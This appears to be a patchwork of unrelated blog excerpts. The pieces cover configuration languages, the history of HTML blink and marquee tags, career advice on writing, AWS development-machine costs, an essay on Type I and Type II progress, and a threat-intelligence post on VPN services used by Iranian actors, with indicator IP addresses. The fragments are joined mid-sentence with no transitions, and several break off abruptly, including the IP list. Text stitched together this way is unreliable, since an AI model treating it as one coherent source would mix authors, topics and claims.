  <li>Scala’s <a href="https://www.scala-sbt.org/">SBT</a> build system</li>
</ul>

<p>Since general purpose programming languages are designed to enable humans to
specify and communicate mechanizable programs, this approach doesn’t suffer the
same problems as data-serialization formats. Instead, it suffers from a dual
problem: whereas data-serialization formats are too static and inexpressive,
general purpose programming language are too dynamic and expressive.</p>

<p>An application designer would generally like to specify the API of their
configuration system narrowly, to ensure predictable and well defined behavior.

    <p>I was chatting with a fellow web developer recently and made a joke about the <abbr title="Hypertext Markup Language">HTML</abbr> <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code> tags, only to discover that he had no idea what I was talking about. They’re a part of web history that’s fallen off the radar and younger developers are unlikely to have ever come across them. But for a little while, back in the 90s, they were a big deal.</p>

<p>Invention of the <code>&lt;blink&gt;</code> element is often credited to <a href="https://montulli.blogspot.com/">Lou Montulli</a>, who wrote pioneering web browser <a href="https://lynx.invisible-island.net/">Lynx</a> before being joining Netscape in 1994. <a href="http://www.montulli.org/theoriginofthe%3Cblink%3Etag">He insists that he didn’t write any of the code</a> that eventually became the first implementation of <code>&lt;blink&gt;</code>. Instead, he claims: while out at a bar (on the evening he’d first meet his wife!), he pointed out that many of the fancy new stylistic elements the other Netscape engineers were proposing wouldn’t work in Lynx, which is a text-only browser. The fanciest conceivable effect that would work across both browsers would be making the text flash on and off, he joked. Then another engineer – who he doesn’t identify – pulled a late night hack session and added it.</p>
<p>And so it was that <a href="https://www.webdesignmuseum.org/old-software/web-browsers/netscape-navigator-2-0">when Netscape Navigator 2.0 was released in 1995</a> it added support for the <code>&lt;blink&gt;</code> tag. Also animated <abbr title="Graphics Interchange Format (file)s">GIFs</abbr> and the first inklings of JavaScript, which collectively would go on to <em>define</em> the “personal website” experience for years to come. Here’s how you’d use it:</p>
<pre><code>&lt;BLINK&gt;This is my blinking text!&lt;/BLINK&gt;</code></pre>
<p>With no attributes, it was clear from the outset that this tag was supposed to be a joke. By the time <abbr title="Hypertext Markup Language, version 4">HTML4</abbr> was published as a a recommendation two years later, <a href="https://www.w3.org/Style/HTML40-plus-blink.dtd">it was <em>documented</em> as being a joke</a>. But the Web of the late 1990s saw it used <em>a lot</em>. If you wanted somebody to notice the “latest updates” section on your personal home page, you’d wrap a <code>&lt;blink&gt;</code> tag around the title (or, if you were a sadist, the entire block).</p>

<p>In the same year as Netscape Navigator 2.0 was released, <a href="https://www.webdesignmuseum.org/old-software/web-browsers/internet-explorer-2-0">Microsoft released Internet Explorer 2.0</a>. At this point, Internet Explorer was still very-much playing catch-up with the features the Netscape team had implemented, but clearly some senior Microsoft engineer took a look at the <code>&lt;blink&gt;</code> tag, refused to play along with the joke, but had an innovation of their own: the <code>&lt;marquee&gt;</code> tag! It had <a href="http://www.lissaexplains.com/fun3.shtml">a whole suite of attributes</a> to control the scroll direction, speed, and whether it looped or bounced backwards and forwards. While <code>&lt;blink&gt;</code> encouraged disgusting and inaccessible design as a joke, <code>&lt;marquee&gt;</code> did it on purpose.</p>
<pre><code>&lt;MARQUEE&gt;Oh my god this still works in most modern browsers!&lt;/MARQUEE&gt;</code></pre>
<blockquote><p><marquee>Oh my god this still works in most modern browsers!</marquee></p>

</blockquote>
<p>But here’s the interesting bit: for a while in the late 1990s, it became a somewhat common practice to wrap content that you wanted to emphasise with animation in <em>both</em> a <code>&lt;blink&gt;</code> and a <code>&lt;marquee&gt;</code> tag. That way, the Netscape users would see it flash, the <abbr title="Internet Explorer">IE</abbr> users would see it scroll or bounce. Like this:</p>
<pre><code>&lt;MARQUEE&gt;&lt;BLINK&gt;This is my really important message!&lt;/BLINK&gt;&lt;/MARQUEE&gt;</code></pre>
<figure id="attachment_17887" aria-describedby="caption-attachment-17887"><a href="https://danq.me/wp-content/uploads/2020/11/IE5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/IE5.gif" alt="Internet Explorer 5 showing a marquee effect." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xIE5-30x23.gif.pagespeed.ic.V9MhE6Bblw.jpg"></a><figcaption id="caption-attachment-17887">Wrap a <code>&lt;blink&gt;</code> inside a <code>&lt;marquee&gt;</code> and <abbr title="Internet Explorer">IE</abbr> users will see the marquee. Delightful.</figcaption></figure>
<p>The web has always been built on <a href="https://en.wikipedia.org/wiki/Robustness_principle">Postel’s Law</a>: a web browser should assume that it won’t understand everything it reads, but it should provide a best-effort rendering for the benefit of its user anyway. Ever wondered why the modern <code>&lt;video&gt;</code> element is a block rather than a self-closing tag? It’s so you can embed <em>within</em> it code that an earlier browser – one that doesn’t understand <code>&lt;video&gt;</code> – can read (a browser’s default state when seeing a new element it doesn’t understand is to ignore it and carry on). So embedding a <code>&lt;blink&gt;</code> in a <code>&lt;marquee&gt;</code> gave you the best of both worlds, right? <em>(welll…)</em></p>
<figure id="attachment_17889" aria-describedby="caption-attachment-17889"><a href="https://danq.me/wp-content/uploads/2020/11/Netscape5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Netscape5.gif" alt="Netscape Navigator 5 showing a blink effect." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xNetscape5-30x23.gif.pagespeed.ic.7MCcOVo4rn.jpg"></a><figcaption id="caption-attachment-17889">Wrap a <code>&lt;blink&gt;</code> inside a <code>&lt;marquee&gt;</code> and Netscape users will see the blink. Joy.</figcaption></figure>
<p>Better yet, you were safe in the knowledge that anybody using a browser that didn’t understand <em>either</em> of these tags could <em>still read your content</em>. Used properly, the web is about <em>progressive enhancement</em>. Implement for everybody, enhance for those who support the shiny features. JavaScript and <abbr title="Cascading Style Sheets">CSS</abbr> can be applied with the same rules, and doing so pays dividends in maintainability and accessibility (though, sadly, that doesn’t stop people writing sites that needlessly <em>require</em> these technologies).</p>
<figure id="attachment_17891" aria-describedby="caption-attachment-17891"><a href="https://danq.me/wp-content/uploads/2020/11/Opera5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Opera5.gif" alt="Opera 5 showing no blinking nor marquee text." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xOpera5-30x23.gif.pagespeed.ic.lyeZs3hC1_.jpg"></a><figcaption id="caption-attachment-17891">Personally, I was a (paying! – back when people used to pay for web browsers!) Opera user so I mostly saw neither <code>&lt;blink&gt;</code> nor <code>&lt;marquee&gt;</code> elements. I don’t feel like I missed out.</figcaption></figure>
<p>I remember, though, the first time I tried Netscape 7, in 2002. Netscape 7 and its close descendent are, as far as I can tell, the only web browsers to support <em>both</em> <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code>. Even then, it was picky about the order in which they were presented and the elements wrapped-within them. But support was good enough that some people’s personal web pages suddenly began to exhibit the most ugly effect imaginable: the combination of both scrolling and flashing text.</p>
<figure id="attachment_17892" aria-describedby="caption-attachment-17892"><a href="https://danq.me/wp-content/uploads/2020/11/Netscape7.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Netscape7.gif" alt="Netscape 7 showing text that both blinks and marquee-scrolls." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xNetscape7-30x23.gif.pagespeed.ic.2Feg-ZbrR7.jpg"></a><figcaption id="caption-attachment-17892">If Netscape 7’s <abbr title="User Interface">UI</abbr> didn’t already make your eyes bleed (I’ve toned it down here by installing the “classic skin”), its simultaneous rendering of <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code> would.</figcaption></figure>
<p>The <code>&lt;blink&gt;</code> tag is very-definitely <a href="https://caniuse.com/?search=blink">dead</a> (<a href="http://tstbtbt.com/">hurrah!</a>), but you can <a href="https://www.w3docs.com/snippets/css/how-to-create-a-blinking-effect-with-css3-animations.html">bring it back with pure&nbsp;</a><abbr title="Cascading Style Sheets"><a href="https://www.w3docs.com/snippets/css/how-to-create-a-blinking-effect-with-css3-animations.html">CSS</a></abbr> if you must. <code>&lt;marquee&gt;</code>, amazingly, still <a href="https://caniuse.com/?search=marquee">survives</a>, not only in <a href="https://remysharp.com/2008/09/10/the-silky-smooth-marquee/">polyfills</a> but <em>natively</em>, as you might be able to see above. However, if you’re in any doubt as to whether or not you should use it: you shouldn’t. If you’re looking for digital nostalgia, <a href="https://theoutline.com/post/8442/internet-nostalgia-2010s-geocities-tumblr-vaporwave">there’s a whole rabbit hole to dive down</a>, but you don’t need to inflict <code>&lt;marquee&gt;</code> on the rest of us.</p>

Inevitably, they have paved the path for entire industries to follow.</p><p>Therefore, it's highly likely that your next company will be working remotely.</p><p>In remote settings, with little face-to-face interaction, written communication becomes the key.</p><h3 id="your-competitive-advantage-in-a-tough-job-market">Your competitive advantage in a tough job market</h3><p>Work-from-home means that the competitors for your next job are not just from your city, they are from your entire country and potentially the whole world. Add economic depression and rock bottom unemployment rates to the mix, and you have a saturated job market.</p><p>You need to find a way to stand out.</p><p>Being a good writer will help you. </p><p>When deciding between a few candidates to fill a position, companies like Basecamp hire the better writer. People of Basecamp have been working remotely for more than 20 years and great writing is a <a href="https://basecamp.com/gettingreal/08.6-wordsmiths">prerequisite</a> for every single position they have.</p><p>Being a good writer helps you get a new job. A better job.</p><p>But more importantly, it helps you do your everyday work better and therefore, changes the arc of your entire career!</p><figure><img src="https://www.nityesh.com/content/images/2020/11/Career-boost.jpg" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/Career-boost.jpg 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/Career-boost.jpg 1000w, https://www.nityesh.com/content/images/size/w1600/2020/11/Career-boost.jpg 1600w, https://www.nityesh.com/content/images/2020/11/Career-boost.jpg 2048w" sizes="(min-width: 720px) 720px"><figcaption>Effect of good writing skills on the progress in your career</figcaption></figure><p>Here are 3 ways it boosts your career:</p><p><strong>1. Grabbing the valuable attention of people around you</strong></p><ul><li>You need your peers to read that awesome idea you propose.</li><li>You need your subordinates to pay attention to you.</li><li>You need hiring managers to read your next job application.</li><li>You need interesting people, that you admire, to read and answer your cold emails.</li><li>You need your connections on LinkedIn or Twitter to pay attention to your posts - we all know, better connections mean better opportunities.</li></ul><p>Yet, you can't rely on the awesomeness of your ideas to grab their attention. Everyone has loads of them.</p><p>What differentiates successful people is their ability to convey their ideas in ways that makes people want to pay attention.</p><blockquote><em><em><em>"Being a good writer is about more than writing. Clear writing is a sign of clear thinking. Great writers know how to communicate. They make things easy to understand. They can put themselves in someone else’s shoes. They know what to omit."</em></em></em><p><em>- David Heinemeier Hanson and Jason Fried, founders of Basecamp</em></p></blockquote><p><strong>2. Finding new career opportunities</strong></p><p>Writing on the Internet can advance your career. A well-written article, published on the Internet, works 24 hours a day, 365 days a year to find new opportunities for you!</p><p>Therefore, your blog is like a resume, only better.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Having seen this from both sides of the table: a great essay is a much better window into a candidate’s ability than any resume and most full interview packets.</p><p>Also, unlike resumes, senior people read them for fun and start outbound hiring conversations based on them. <a href="https://t.co/FOEDqtKt7k">https://t.co/FOEDqtKt7k</a></p></div>— Patrick McKenzie (@patio11) <a href="https://twitter.com/patio11/status/1290854152277389313?ref_src=twsrc%5Etfw">August 5, 2020</a></blockquote>

</figure><p>Writing a useful article is the quickest way to establish yourself as an expert in that field. No degrees required.</p><p>Two years ago, I wrote an article to help people get started with <a href="https://nityesh.com/getting-started-reading-research-papers-dl/">reading Deep Learning research papers</a>. It still fetches me LinkedIn connections from PhDs in universities around the world. Funny thing is that I have read only one research paper in my life - when I wrote the article!</p><blockquote><em><em><em>"By making it easy for people to find you online, you’ll create a vehicle for serendipity."</em></em></em><p><em>- David Perell, creator of the popular course Write of Passage</em></p></blockquote><p>Good online presence allows you to connect with like-minded people around the world, who you would never be able to meet in real life. And meaningful social connections are often the source of surreal career opportunities.</p><p><strong>3. Improving your thinking</strong></p><blockquote><em>"You don’t just write to share what you think. You write to discover what you think in the first place."</em><p><em>- Matt Mullenweg, CEO of Automattic, the company behind Wordpress</em></p></blockquote><p>Compressing your thoughts into the written word removes noise from your thoughts. Clear writing induces clear thinking.</p><p>This is why Jeff Bezos makes his executives prepare <a href="https://www.sec.gov/Archives/edgar/data/1018724/000119312518121161/d456916dex991.htm">6-page narratives</a> instead of 20-slide Powerpoint before any meeting. Bezos believes that Powerpoint presentations conceal lazy thinking. Instead, he wants his employees to think deeply and take the time to express their thoughts cogently.</p><p>I'm often amazed to see how writing an idea leaves me with a better version of the idea itself. It makes me realise how sloppy my thinking usually is.</p><p>Writing clearly can have the same effect on your thinking too. </p><figure><img src="https://www.nityesh.com/content/images/2020/11/image-1.png" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/image-1.png 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/image-1.png 1000w, https://www.nityesh.com/content/images/2020/11/image-1.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>These 3 benefits create a self-sustaining flywheel that accelerates your career</figcaption></figure><p>So, how do you start?</p><p>You've probably taken writing lessons in school.</p><p>And yet, so much of what school teaches you is worse than useless. It hurts you in real life. You need to unlearn so much if you want to write meaningful things in real life.</p><p>Here are some of the things that school made you do in order to get respectable grades:</p><ul><li>You followed minimum word limits. Whereas, the real world has maximum word limits - the key is to convey your message in as few words as possible.</li><li>You followed rigid formats for "creative" writing. There was a format for essays, formal letters and even, informal letters! Well, guess what? Nobody likes it when you are formulaic and everyone loves being surprised.</li><li>You wrote an introductory paragraph before you made your point. Whereas, in the real world, your first sentence needs to grab the reader. Nobody has the time to read an introduction to your main content.</li><li>You wrote what was prescribed instead of what you wanted. You never realized that you write your best when you write about something that you are excited about.</li></ul><figure><img src="https://www.nityesh.com/content/images/2020/11/image-2.png" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/image-2.png 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/image-2.png 1000w, https://www.nityesh.com/content/images/2020/11/image-2.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>No one told you that too much focus on getting good at school can actually do you harm</figcaption></figure><p>There are writing courses all over the Internet that promise to turn you into a successful author or a professional blogger.</p><p><em><em>Oh, that dream of writing like a pro and monetising your words!</em></em></p><p>But wait, most of us don't aspire to be a professional writer. </p><p>You probably want to be an pragmatic programmer, an insightful data scientist, a great manager or maybe a successful entrepreneur. Don't you?</p><p>By connecting an incredibly useful skill with a dreamy aspiration, those guides miss the point of writing well.</p><p><strong>Learning to write well is about learning to convey your thoughts to others.</strong></p><p>Explaining things is an art. It is the art of getting your argument across. You cannot hope to learn that in a vaccum.

<h2>Cost</h2>
<p><strong>EBS-$0.10 / GB month</strong></p>
<p><strong>EC2-$0.0104 / hour</strong></p>
<p>Cost was a big consideration for me when designing and using this system. This solution is free under AWS Free Tier, but that doesn’t last forever.</p>
<p>As seen below, if you terminate your instance when you are done using it, you’ll run a little over $0.01 an hour. It’ll run you $0.46 a week at 40 hours a week, $1.84 a month, and $22.10 a year, all assuming you are running the instance for 40 hours a week.</p>

<h2>Portability</h2>
<p>I use a free version of <a href="https://terminus.com/">Terminus</a> on all my devices. I can’t recommend Terminus enough, it is a fantastic product.</p>
<p>Using cloud computing also lets me centralize all my secrets. I don’t need to make a new IAM User or API Keys for myself when I get a new machine.</p>
<h2>Experimenting</h2>
<p><img src="https://imgs.xkcd.com/comics/python_environment.png" alt="Python Environment XKCD Comic"></p>
<p>Treating my development machines as Cattle instead of Pets lets me experiment freely.</p>
<p>I never have to worry about breaking my python environment.</p>
<h2>AMD64 vs ARM64</h2>
<p><a href="https://twitter.com/frmr_m/status/1325984164752011265">This tweet</a> brought up an interesting point, with new Mac Laptops running on ARM CPUs, local testing becomes more complicated.</p>
<blockquote>
<p>The impending Dockerpocolypse. Specifically I realized with a mixed architecture k8s cluster that finding images that work on both amd64 and arm64 is not as easy as I’d hope. So what happens when Macs start shipping arm chips?</p>
</blockquote>

        <h4 id="or-the-tale-of-why-we-can-both-go-to-mars-and-save-the-world">(Or: the tale of why we can both go to Mars and save the world)</h4>

<p>Imagine human capability as a high dimensional blob.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>  There are some people who live on the surface of the blob (let’s call it the capability frontier ) - they have access to the best of the knowledge and resources humanity has to offer. <em>Pushing this frontier and expanding maximum possible capabilities is Type I Progress</em>.</p>

<p><img src="https://lh3.googleusercontent.com/v7YtSoUqTzwIAkFUQeN06AtVwqHazuySotlmrI1thsCMDx8bAh1dnL2-G2KPyQ15NQqNRG9s1yHnIXsoXb6NHgkrrKI9WKnJGCCbtmOoVvRi_7xIVYT7OOWl7tZDCJJx00OKE4F-DnNZhhzsxqmq2cZGoVIc_sLvSxXv6qUH3cJiELraDztvEY1gxmHTy_trBFOIxpS53GlEkAq257PuYYvFxGjiUtuQxQpj4U7gPo0zwWD8L64eE-dnQmaW_ZEgxMi5s45LjvDYeOz12gdYB8zJZEoZRkHOxIcHWBte55YWpXi_JXTJuEKeE427ZU-ZbPbvCzf7YTvfL2q6U4xiaC9ue9Z_ec0l0KoIlCNuOkhKAZZXTsmI6tMZ5AMeNFAjPUG8utDG5ZbjEhHUaudUGu_5lfbG2E8TJBWgNq72MP9M3lIP-leSkIkmCkzPazEcBDDoRi-0C8OlgsdlbPcWVArgtarrzYcWP14nWa9gP0oGKUmjClh1rGY51YI5FEhKNMrBmrlXLwS9X_yxFY3LfOCDvmXsIXIszm8OVETrIXtbiU-SqMAjgnr-PkUjfIGFIa3cX_tZSr5s2KkQqP5ZwOBnsVCpFKsXd2XzBq4kgQwNota4h4D4aSJNmaHatPhSGywGtDEEyEpCz0KhGiK7OrO1o8hLfuY2a6F5p53NhP0SNB1_lxl3CSFhu3Vmqam1ULTnrDemeO2So6Ri3aIULsTPgmeQkq9e0gG-S7Mc6migYdXSrg=w898-h947-no">
  </p>

<p>There are many people who don’t live on the surface of the capability blob - most people who live in ‘developing’ nations, for example.  <em>Actions that expand these people’s capabilities towards the frontier are Type II Progress</em>.</p>

<p>Per William Gibson: <a href="https://en.wikiquote.org/wiki/William_Gibson">“The future is here — it’s just not very evenly distributed.”</a> You could think of Type I progress as expanding what the future is, and Type II progress as distributing that future.</p>

<p><a href="http://matt.might.net/articles/phd-school-in-pictures/">There are even some people who might live a little beyond the surface in some dimensions. These are the innovators, the creators of new knowledge.</a></p>

<p>This chart of farm output over time is a great example of Type I and II progress:</p>
<p><img src="https://i.imgur.com/7bwKDFY.png">
</p>
<p>Here’s a simplified version of the above chart.</p>
<p><img src="https://lh3.googleusercontent.com/KnjVQiEJKUa5n-saje01_MSCME3XOgtKkt6pMV4E8C-pILQkh2axGI_Y7hO2gmL0PdVanhGsUX78qu0YJa9uZrfmhRwY1LrfZWdW4srlsn8LYciadYNfozpT-jviqkG7eJRWQY09h65xhv4T1TfYtdu_TuEHSic-5iA7DzhdwBcmpw89r-FSQ4Vv2BU5DGcsJlX9adCinYGF9r8rRjk0IV4lmQ-7303dI36qQqM8bCBWv2SYK55Y8HPczPt5dohXIcN0pUcjF8Tso9Kxr9W4ZsbILFmIHhrznUPESC51CfqeYNIOcvG_zdlLot1LQKNjgWiqGj7dg6sq0AHfkn0pzwmniu1JS2r5i4h6YtWFFI0d64d9aH5jPfdZbTlIDi3O3qY5s-b4wVAuZA5xPaPJ_P7N9a_JkR-7PH_vcecEN2_6BtFXVtp7XPVMbiPke1pVsVWqHVkxMgHDbABY8Vm7E-tM_Fwv7f7Ki6SOTY54H7H9c6LJQaHwEPHcIqxSwpmVvwMhXV4u492hVW0OzP25NLmi3zfUNSIBoz8MmrPej7_iQXvhT59-MVkNBQV7yD79xDldiZh2yLBP1gTyEtK723gLIjq9rjF9b_VK8JXKaLZO63hQJN4jMYZxWWjmZsFyZWq7chyuhfZtwTVRhrWR9az5noKVGkG8FP3ga5Pl28QWZitrjC4kAmITAvapE6usPTXUQXFOzKS_KyKDmqdn6-CkN-0gjIcpGjHyhZ2J-hgkROd27w=w1483-h804-no">
</p>

<p>You can see how from 1960 to 2006 Northeast Asia and
North America were pushing the capability frontier forward (on the total possible output per hectare and total output per worker respectively.)  China as a whole clearly made progress but stayed well within the capability frontier.</p>

<p>Mokyr puts it well in <a href="https://www.amazon.com/Lever-Riches-Technological-Creativity-Economic/dp/0195074777">Lever of Riches</a>:</p>

<p><code>“At any moment there is a large gap between average and best practice technology; reducing this gap by disseminating the techniques used by producers at the cutting edge of knowledge is technological progress without invention.” </code></p>

<p>Type II progress is this “progress without invention.”</p>

<p>This distinction may seem trivial but Type I and Type II progress are often talked about in the same context.  Explicitly calling out the distinction between Type I and Type II progress and thinking about them separately will lead to more action.</p>

<p>In many recent progress-related discussions you often see people who lean towards one type of progress over another talking past each other, and I want to unblock that logjam.</p>

<p>This piece will break down why people confuse Type I and Type II progress (especially rapid Type II progress.) One big confusion-causer is the fact that progress frontiers are geographically fractal which has several implications.</p>

<p>Once we’ve disentangled the two flavors of progress, I will try to convince you that there are strong arguments for spending time and money on both so everybody can stop wasting time debating which is more worthy.</p>

<h2 id="type-i-and-type-ii-progress-are-often-confused">Type I and Type II progress are often confused.</h2>

<p>People often confuse rapid Type II progress for Type I progress. This is in part because</p>

<h3 id="progress-frontiers-are-geographically-fractal">Progress frontiers are geographically fractal.</h3>

<p>Every time you zoom in on a fractal, it presents the same pattern on a different scale. This scale invariance makes it impossible to cleanly separate between places that would benefit from Type I vs Type II progress.</p>

<p>In the United States you would expect California to be right on the frontier - it’s the wealthiest state with progressive policies and hordes of people trying to build the future. Yet there are still hundreds of thousands of farm workers who live lives comparable to residents of developing nations - they clearly are not at the frontier and would benefit more from Type II progress than Type I progress.</p>

<p>Zoom in farther to the San Francisco Bay Area. In only a few square miles there are people pushing the limits of quantum technology living with infrastructure and policies that look like something out of a developing nation.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>You can’t even say that individuals are the quanta where you can draw a clean line between where Type I vs. Type II progress happens. Many researchers on the cutting edge of science follow discredited dietary guidelines from the 1970’s.</p>

<p>This inability to cleanly separate the two types of progress geographically adds evidence to the fact that  <em>“Should we focus on Type I or Type II progress?”</em> is the wrong question.</p>

<p>Another consequence of this fractal nature of progress is that</p>

<h3 id="type-i-and-type-ii-progress-dont-correspond-11-with-developed-and-developing-nations">Type I and Type II progress don’t correspond 1:1 with developed and developing nations.</h3>

<p>Let’s look at the opposite statement “Type I and Type II progress correspond 1:1 to developed and developing nations.”</p>

<p>There are parts of China (Shanghai, Beijing) that are expanding human knowledge and capability - building new augmented reality technology, CRISPRing Babies, etc. But then there are also parts of China that don’t have indoor plumbing.</p>

<p>And as already mentioned, there are even parts of the United States that do not have indoor plumbing or consistent electricity, let alone ride-sharing, etc.</p>

<p>That isn’t to say that the knowledge frontier and developed nation status are uncorrelated. It is simply harder to spend time advancing the future when there are fewer people with all the knowledge and abilities that are at the frontier.  At the end of the day Type I progress is easier to do in developed nations.</p>

<p>New technology requires previous infrastructure.  Take the “Connecticut Yankee” scenario - if you dropped even the most experienced team of engineers in medieval Europe, they would be hard-pressed to create anything useful without modern tools, and supply chains.  Additionally, “process knowledge” - the nitty-gritty subtleties of building things that are near-impossible to transmit via writing may be even more important than physical infrastructure.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">3</a></sup></p>

<p>A stronger statement is that</p>

<h3 id="you-can-only-push-the-frontier-on-dimensions-where-you-are-at-the-frontier">You can only push the frontier on dimensions where you are at the frontier</h3>
<p>Many people point to China and countries in Africa “technologically leapfrogging” the United States.  The flagship evidence is Chinese mobile payments and cell phone propagation in Africa.</p>

<p>However, this evidence is not a sign that those places will soon eclipse the US technologically. Precision is essential when we’re talking about the technological frontier. These places can push the frontier <em>on those dimensions</em> - mobile payments and mobile phones as the computing center.</p>

<p>It might ruffle some feathers but this argument suggests that developed nations should prioritize Type I progress while developing nations should prioritize Type II progress.</p>

<h2 id="disentangling-type-i-and-type-ii">Disentangling Type I and Type II</h2>
<p>There is a lot of explicit and (more insidiously) implicit discussion about which type of progress is more important. But “Should we focus on Type I or Type II progress?” is the wrong question. Debating the abstract relative merits of Type I and Type II progress is a waste of time .</p>

<h3 id="why-should-we-focus-on-type-i-or-type-ii-progress-is-the-wrong-question">Why “Should we focus on Type I or Type II progress?” is the wrong question</h3>

<p>Because progress frontiers are geographically fractal you need to specify the scale and location you’re talking about. Then you will be able to say “at this scale and location what would be the result of a focus on Type I vs Type II progress?” <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">4</a></sup>  As already mentioned, Type I progress is easier to do in developed nations and its only possible to make progress along dimensions where you are already on the frontier.</p>

<p>Organizations can then decide what they should focus on based on their specific scale, location, and mandate. For example, a sub-saharan African nation should not be spending money on a national science program.</p>

<p>Individuals should decide whether to focus on the type of progress that fascinates them the most because debating the abstract relative merits of Type I and Type II progress is a waste of time.</p>

<h3 id="arguments-for-the-importance-of-both-type-i-and-type-ii-progress">Arguments for the Importance of Both Type I and Type II Progress</h3>
<p>There are good arguments for focusing on both types of progress. I would categorize the arguments into categories - eliminating bad things and enabling great things.</p>

<h4 id="arguments-for-focusing-on-type-i-progress">Arguments for focusing on Type I progress</h4>
<p>The arguments for focusing on Type I progress are 20% eliminating bad things and 80% enabling great things.</p>

<p>Most of the reasons that Type I progress enables great things are self evident - Type I progress is what turns science fiction into reality.</p>

<p>However, even if you reject “more cool sci-fi stuff” as an intrinsic argument, Tyler Cowen argues in <a href="https://www.amazon.com/Stubborn-Attachments-Prosperous-Responsible-Individuals/dp/1732265135">Stubborn Attachments</a> that long term growth is a moral imperative. In the long run, Type II progress cannot exist without Type I progress. In fact, the rate of Type II progress may be proportional to the distance to the frontier (but this needs evidence.) In a few cases, Type I Progress can enable Type II progress. Normally though, attempts to use cutting edge knowledge to help people in Type II situations ends with broken <a href="https://www.kickstarter.com/projects/unchartedplay/soccket-the-energy-harnessing-soccer-ball">energy-balls</a> and <a href="https://blogs.ei.columbia.edu/2010/07/01/the-playpump-what-went-wrong/">PlayPumps</a> because there is no infrastructure or knowledge to maintain them. So sadly those are exceptions to the rule, and “Type I progress can enable Type II progress” that is not actually a strong argument.</p>

<h4 id="arguments-for-focusing-on-type-ii-progress">Arguments for focusing on Type II progress</h4>
<p>The arguments for focusing on Type II progress are 80% eliminating bad things and 20% enabling great things.</p>

<p>In the eliminating-bad-things category, Type II progress dominates. Type II progress is a clear way to relieve human suffering in the short term which makes a strong moral argument for Type II focus.</p>

<p>The arguments for Type II progress in the enabling great things category are more subtle. Over a long enough timescale, if you focus on Type II progress, you will have more frontier-dwellers simply because Type II progress pushes people up to the frontier. Since you can only push the frontier on dimensions where you are at the frontier, more people pushing the frontier will lead to more frontier expansion.</p>

<p><em>“Okay, but I have &lt;$1B/ 24 hours in a day/ a government organization at my disposal&gt; - should I focus on Type I or Type II progress?”</em></p>

<p>The unsatisfying answer is always going to be: it depends. Remember that because progress frontiers are geographically fractal the answer depends on time and geographic scale.  What are you compelled by as an individual or have a mandate to worry about as an organization? Which contexts provide the most leverage to different types …</p></article></div>

<p>TL;DR APTs use commercial VPNs and proxies. Knowing which service matters.</p>
<p>Several weeks ago DHS/CISA <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-304a" target="_blank" rel="noopener noreferrer">issued an alert</a> that Iranian actors were targeting US election websites. The actors scraped voter registration data, scanned for vulnerabilities, sent voter intimidation emails, and threw exploits.</p>
<p>The report makes a note that this actor uses VPN services for anonymity. Unfortunately, that isn't very specific. We (Spur) provide data to show <em>what</em> VPN services are being used. Threat actors, like everyone, have preferred tools, tactics, and techniques. Knowing these tactics makes for more effective defensive strategies.</p>
<p>I am going to walk through the list of IPs mentioned in the alert as Spur sees them with our data. Spoiler Alert: It's primarily <a href="https://privateinternetaccess.com/" target="_blank" rel="noopener noreferrer">Private Internet Access</a> and <a href="https://nordvpn.com/" target="_blank" rel="noopener noreferrer">Nord VPN</a>, but there are outliers.</p>
<h2 id="analysis">Analysis</h2>
<p>Here is the full list of alert IP addresses we will look at:</p>
<pre><code>102.129.239.185
104.206.13.27

195.181.170.244
198.147.23.147
198.16.66.139

<p>First, I used the Spur <a href="" target="_blank" rel="noopener noreferrer">Context API</a> to enrich the IP addresses. Here is a sample result:</p>

<p>Above, we can see that <code>185.191.207.52</code> is a Nord VPN exit. It averages 100 active users at any given time. This is busy, even for Nord. <code>185.191.207.52</code> proxies traffic for Luminati and Geosurf. Finally, the geo-precision field indicates heavy usage from Iran.</p>
<h3 id="services-used">Services Used</h3>
<p>A majority of the IPs belong to Nord VPN and PIA. There are two outliers: Browsec VPN and Tor Guard VPN. Is this another actor? Were these used for different activities?</p>

<h3 id="exit-countries">Exit Countries</h3>
<p>The exit locations chosen (server location) are primarily in the US and Europe. It is possible the US was chosen to blend in on traditional server geo application or firewall rules.</p>
<pre><code>  16 US
   5 GB
   4 NL
   4 IL
   2 LU
   2 BE
   1 ZA
   1 IR
   1 FR
   1 DE
   1 CA</code></pre>
<h3 id="usage-density">Usage Density</h3>
<p>Usage density was varied across all of these IPs. Some serve a handful of clients, others are fairly large gateways. This insight can really help narrow down where analysts should focus attention.</p>
<p><img src="https://firebasestorage.googleapis.com/v0/b/spur-us-prod.appspot.com/o/public%2Firanian-apt-nord%2Fip_user_count.png?alt=media" alt=""></p>
<h3 id="the-non-vpn">The Non-VPN</h3>
<p>Spur was not able to identify a VPN operating on <code>5.160.253.50</code>. This IP is especially interesting because it is a proxy in the Geosurf network. There are a few possibilities that could be worth exploring with more data. Is this their first hop IP? Is it possible that Geosuf is the actual common thread between all of these activities? Is this an anonymization or malware network Spur does not track?</p>
<h2 id="further-analysis">Further Analysis</h2>
<p>Some interesting questions could warrant further investigation:</p>
<ol>
<li><p>This actor prefers Nord VPN and PIA. They also used Browsec VPN and Tor Guard VPN. How did activity differ between these?</p>
</li>
